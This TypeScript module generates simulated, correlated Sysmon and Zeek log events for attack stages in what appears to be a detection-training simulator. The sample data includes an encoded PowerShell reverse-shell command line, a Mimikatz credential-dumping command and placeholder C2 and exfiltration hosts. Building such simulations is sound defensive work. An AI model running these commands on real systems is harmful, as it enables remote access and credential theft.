// Unified event generator - creates correlated events across all log sources

import type { 
  SimulatedEvent, 
  LogSource, 
  AttackStage,
  AttackChain,
  ProcessTreeNode,
  NetworkContext 
} from './types';
import { generateSysmonEvent, SYSMON_EVENT_IDS, type SysmonEvent } from '../log-generators/sysmon-generator';
import { generateZeekConnLog, generateZeekHTTPLog, generateZeekDNSLog, type ZeekConnLog, type ZeekHTTPLog, type ZeekDNSLog } from '../log-generators/zeek-generator';

export interface EventGenerationContext {
  scenario_id: string;
  session_id: string;
  hostname: string;
  username: string;
  sourceIP: string;
  attack_chain: AttackChain;
  shared_artifacts: {
    malicious_ips: string[];
    malicious_domains: string[];
    malicious_hashes: string[];
    processes: Map<string, ProcessTreeNode>;
  };
}

export function generateCorrelatedEvents(
  context: EventGenerationContext,
  stage: AttackChain['stages'][0]
): SimulatedEvent[] {
  const events: SimulatedEvent[] = [];
  const correlationKey = `${context.scenario_id}-${stage.technique_id}`;

  // Generate events based on technique
  switch (stage.technique_id) {
    case 'T1566.001': // Phishing Attachment
      events.push(...generatePhishingEvents(context, stage, correlationKey));
      break;
    case 'T1059.001': // PowerShell Execution
      events.push(...generatePowerShellEvents(context, stage, correlationKey));
      break;
    case 'T1071.001': // C2 Communication
      events.push(...generateC2Events(context, stage, correlationKey));
      break;
    case 'T1003': // Credential Dumping
      events.push(...generateCredentialDumpingEvents(context, stage, correlationKey));
      break;
    case 'T1021.002': // Lateral Movement
      events.push(...generateLateralMovementEvents(context, stage, correlationKey));
      break;
    case 'T1048': // Exfiltration
      events.push(...generateExfiltrationEvents(context, stage, correlationKey));
      break;
    default:
      // Generic event generation
      events.push(...generateGenericEvents(context, stage, correlationKey));
  }

  // Link events together
  linkRelatedEvents(events, correlationKey);

  // Update attack chain with generated event IDs
  stage.events = events.map(e => e.id);

  return events;
}

function generatePhishingEvents(
  context: EventGenerationContext,
  stage: AttackChain['stages'][0],
  correlationKey: string
): SimulatedEvent[] {
  const events: SimulatedEvent[] = [];
  const timestamp = stage.timestamp;

  // Sysmon: Process creation from document
  const sysmonEvent = generateSysmonEvent(SYSMON_EVENT_IDS.PROCESS_CREATE, true, {
    hostname: context.hostname,
    username: context.username,
    processName: 'WINWORD.EXE',
    parentProcess: 'explorer.exe',
    commandLine: 'WINWORD.EXE /n "C:\\Users\\Downloads\\suspicious_document.doc"',
  });

  events.push({
    id: `event-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    source: 'sysmon',
    scenario_id: context.scenario_id,
    session_id: context.session_id,
    technique_id: stage.technique_id,
    stage: stage.stage,
    timestamp,
    details: sysmonEvent as Record<string, any>,
    related_event_ids: [],
    correlation_key: correlationKey,
    process_tree: {
      process_id: sysmonEvent.EventData.ProcessId || '',
      process_name: 'WINWORD.EXE',
      command_line: sysmonEvent.EventData.CommandLine || '',
      children: [],
      timestamp,
      user: context.username,
      hostname: context.hostname,
    },
    threat_score: 70,
  });

  // File creation event
  const fileEvent = generateSysmonEvent(SYSMON_EVENT_IDS.FILE_CREATE, true, {
    hostname: context.hostname,
    username: context.username,
    filename: 'C:\\Users\\Downloads\\suspicious_document.doc',
  });

  events.push({
    id: `event-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    source: 'sysmon',
    scenario_id: context.scenario_id,
    session_id: context.session_id,
    technique_id: stage.technique_id,
    stage: stage.stage,
    timestamp,
    details: fileEvent as Record<string, any>,
    related_event_ids: [events[0].id],
    correlation_key: correlationKey,
    threat_score: 60,
  });

  return events;
}

function generatePowerShellEvents(
  context: EventGenerationContext,
  stage: AttackChain['stages'][0],
  correlationKey: string
): SimulatedEvent[] {
  const events: SimulatedEvent[] = [];
  const timestamp = stage.timestamp;

  // Get or create malicious IP for this scenario
  const maliciousIP = context.shared_artifacts.malicious_ips[0] || '185.220.101.0';
  if (!context.shared_artifacts.malicious_ips.includes(maliciousIP)) {
    context.shared_artifacts.malicious_ips.push(maliciousIP);
  }

  // Sysmon: PowerShell process creation with encoded command
  const psCommand = 'powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQA9ACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwA=';
  
  const sysmonEvent = generateSysmonEvent(SYSMON_EVENT_IDS.PROCESS_CREATE, true, {
    hostname: context.hostname,
    username: context.username,
    processName: 'powershell.exe',
    parentProcess: 'WINWORD.EXE',
    commandLine: psCommand,
  });

  const processEvent: SimulatedEvent = {
    id: `event-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    source: 'sysmon',
    scenario_id: context.scenario_id,
    session_id: context.session_id,
    technique_id: stage.technique_id,
    stage: stage.stage,
    timestamp,
    details: sysmonEvent as Record<string, any>,
    related_event_ids: [],
    correlation_key: correlationKey,
    process_tree: {
      process_id: sysmonEvent.EventData.ProcessId,
      process_name: 'powershell.exe',
      command_line: psCommand,
      parent_id: sysmonEvent.EventData.ParentProcessId,
      children: [],
      timestamp,
      user: context.username,
      hostname: context.hostname,
    },
    threat_score: 85,
  };

  events.push(processEvent);

  // Sysmon: Network connection from PowerShell
  const networkEvent = generateSysmonEvent(SYSMON_EVENT_IDS.NETWORK_CONNECT, true, {
    hostname: context.hostname,
    username: context.username,
    destIP: maliciousIP,
    destPort: 4444,
  });

  events.push({
    id: `event-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    source: 'sysmon',
    scenario_id: context.scenario_id,
    session_id: context.session_id,
    technique_id: stage.technique_id,
    stage: stage.stage,
    timestamp: new Date(new Date(timestamp).getTime() + 2000).toISOString(), // 2 seconds later
    details: networkEvent as Record<string, any>,
    related_event_ids: [processEvent.id],
    correlation_key: correlationKey,
    network_context: {
      source_ip: context.sourceIP,
      dest_ip: maliciousIP,
      source_port: parseInt(networkEvent.EventData.SourcePort || '49152'),
      dest_port: 4444,
      protocol: 'tcp',
      bytes_sent: 150,
      bytes_received: 200,
      duration: 10,
      related_connections: [],
    },
    threat_score: 90,
  });

  // Zeek: Connection log
  const zeekConn = generateZeekConnLog(true, {
    sourceIP: context.sourceIP,
    destIP: maliciousIP,
  });

  events.push({
    id: `event-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    source: 'zeek',
    scenario_id: context.scenario_id,
    session_id: context.session_id,
    technique_id: stage.technique_id,
    stage: stage.stage,
    timestamp: new Date(new Date(timestamp).getTime() + 2000).toISOString(),
    details: zeekConn as Record<string, any>,
    related_event_ids: [events[events.length - 1].id], // Link to previous network event
    correlation_key: correlationKey,
    network_context: {
      source_ip: context.sourceIP,
      dest_ip: maliciousIP,
      source_port: zeekConn.id_orig_p,
      dest_port: zeekConn.id_resp_p,
      protocol: zeekConn.proto,
      bytes_sent: zeekConn.orig_bytes,
      bytes_received: zeekConn.resp_bytes,
      duration: zeekConn.duration,
      related_connections: [],
    },
    threat_score: 85,
  });

  return events;
}

function generateC2Events(
  context: EventGenerationContext,
  stage: AttackChain['stages'][0],
  correlationKey: string
): SimulatedEvent[] {
  const events: SimulatedEvent[] = [];
  const timestamp = stage.timestamp;
  const maliciousIP = context.shared_artifacts.malicious_ips[0] || '185.220.101.0';
  const maliciousDomain = context.shared_artifacts.malicious_domains[0] || 'c2-malicious-domain.com';

  // Zeek: HTTP beacon
  const httpLog = generateZeekHTTPLog(true, {
    sourceIP: context.sourceIP,
    destIP: maliciousIP,
    host: maliciousDomain,
  });

  events.push({
    id: `event-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    source: 'zeek',
    scenario_id: context.scenario_id,
    session_id: context.session_id,
    technique_id: stage.technique_id,
    stage: stage.stage,
    timestamp,
    details: httpLog as Record<string, any>,
    related_event_ids: [],
    correlation_key: correlationKey,
    network_context: {
      source_ip: context.sourceIP,
      dest_ip: maliciousIP,
      source_port: httpLog.id_orig_p,
      dest_port: httpLog.id_resp_p,
      protocol: 'tcp',
      bytes_sent: httpLog.request_body_len,
      bytes_received: httpLog.response_body_len,
      duration: 5,
      related_connections: [],
    },
    threat_score: 95,
  });

  // Zeek: DNS query
  const dnsLog = generateZeekDNSLog(true, {
    sourceIP: context.sourceIP,
    query: maliciousDomain,
  });

  events.push({
    id: `event-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    source: 'zeek',
    scenario_id: context.scenario_id,
    session_id: context.session_id,
    technique_id: stage.technique_id,
    stage: stage.stage,
    timestamp: new Date(new Date(timestamp).getTime() - 1000).toISOString(), // 1 second before HTTP
    details: dnsLog as Record<string, any>,
    related_event_ids: [events[0].id],
    correlation_key: correlationKey,
    threat_score: 80,
  });

  return events;
}

function generateCredentialDumpingEvents(
  context: EventGenerationContext,
  stage: AttackChain['stages'][0],
  correlationKey: string
): SimulatedEvent[] {
  const events: SimulatedEvent[] = [];
  const timestamp = stage.timestamp;

  // Sysmon: Mimikatz-like process
  const mimikatzEvent = generateSysmonEvent(SYSMON_EVENT_IDS.PROCESS_CREATE, true, {
    hostname: context.hostname,
    username: context.username,
    processName: 'mimikatz.exe',
    commandLine: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"',
  });

  events.push({
    id: `event-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    source: 'sysmon',
    scenario_id: context.scenario_id,
    session_id: context.session_id,
    technique_id: stage.technique_id,
    stage: stage.stage,
    timestamp,
    details: mimikatzEvent as Record<string, any>,
    related_event_ids: [],
    correlation_key: correlationKey,
    process_tree: {
      process_id: mimikatzEvent.EventData.ProcessId,
      process_name: 'mimikatz.exe',
      command_line: mimikatzEvent.EventData.CommandLine,
      children: [],
      timestamp,
      user: context.username,
      hostname: context.hostname,
    },
    threat_score: 100, // Critical
  });

  // Sysmon: Process access to LSASS
  const lsassAccess = generateSysmonEvent(SYSMON_EVENT_IDS.PROCESS_ACCESS, true, {
    hostname: context.hostname,
    username: context.username,
    targetProcess: 'lsass.exe',
  });

  events.push({
    id: `event-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    source: 'sysmon',
    scenario_id: context.scenario_id,
    session_id: context.session_id,
    technique_id: stage.technique_id,
    stage: stage.stage,
    timestamp: new Date(new Date(timestamp).getTime() + 1000).toISOString(),
    details: lsassAccess as Record<string, any>,
    related_event_ids: [events[0].id],
    correlation_key: correlationKey,
    threat_score: 100,
  });

  return events;
}

function generateLateralMovementEvents(
  context: EventGenerationContext,
  stage: AttackChain['stages'][0],
  correlationKey: string
): SimulatedEvent[] {
  const events: SimulatedEvent[] = [];
  const timestamp = stage.timestamp;
  const targetHost = '10.0.1.50'; // Lateral movement target

  // Sysmon: SMB connection
  const smbEvent = generateSysmonEvent(SYSMON_EVENT_IDS.NETWORK_CONNECT, true, {
    hostname: context.hostname,
    username: context.username,
    destIP: targetHost,
    destPort: 445,
  });

  events.push({
    id: `event-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    source: 'sysmon',
    scenario_id: context.scenario_id,
    session_id: context.session_id,
    technique_id: stage.technique_id,
    stage: stage.stage,
    timestamp,
    details: smbEvent as Record<string, any>,
    related_event_ids: [],
    correlation_key: correlationKey,
    network_context: {
      source_ip: context.sourceIP,
      dest_ip: targetHost,
      source_port: parseInt(smbEvent.EventData.SourcePort || '49152'),
      dest_port: 445,
      protocol: 'tcp',
      bytes_sent: 500,
      bytes_received: 300,
      duration: 2,
      related_connections: [],
    },
    threat_score: 85,
  });

  return events;
}

function generateExfiltrationEvents(
  context: EventGenerationContext,
  stage: AttackChain['stages'][0],
  correlationKey: string
): SimulatedEvent[] {
  const events: SimulatedEvent[] = [];
  const timestamp = stage.timestamp;
  const maliciousIP = context.shared_artifacts.malicious_ips[0] || '185.220.101.0';

  // Zeek: Large HTTP POST (exfiltration)
  const exfilLog = generateZeekHTTPLog(true, {
    sourceIP: context.sourceIP,
    destIP: maliciousIP,
    method: 'POST',
    uri: '/exfil',
  });

  // Make it look like large data transfer
  exfilLog.request_body_len = 50000 + Math.floor(Math.random() * 50000);
  exfilLog.response_body_len = 200;

  events.push({
    id: `event-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    source: 'zeek',
    scenario_id: context.scenario_id,
    session_id: context.session_id,
    technique_id: stage.technique_id,
    stage: stage.stage,
    timestamp,
    details: exfilLog as Record<string, any>,
    related_event_ids: [],
    correlation_key: correlationKey,
    network_context: {
      source_ip: context.sourceIP,
      dest_ip: maliciousIP,
      source_port: exfilLog.id_orig_p,
      dest_port: exfilLog.id_resp_p,
      protocol: 'tcp',
      bytes_sent: exfilLog.request_body_len,
      bytes_received: exfilLog.response_body_len,
      duration: 10,
      related_connections: [],
    },
    threat_score: 90,
  });

  return events;
}

function generateGenericEvents(
  context: EventGenerationContext,
  stage: AttackChain['stages'][0],
  correlationKey: string
): SimulatedEvent[] {
  // Fallback for unknown techniques
  return [];
}

function linkRelatedEvents(events: SimulatedEvent[], correlationKey: string): void {
  // Link events that share the same correlation key
  events.forEach(event => {
    event.related_event_ids = events
      .filter(e => e.id !== event.id && e.correlation_key === correlationKey)
      .map(e => e.id);
  });
}

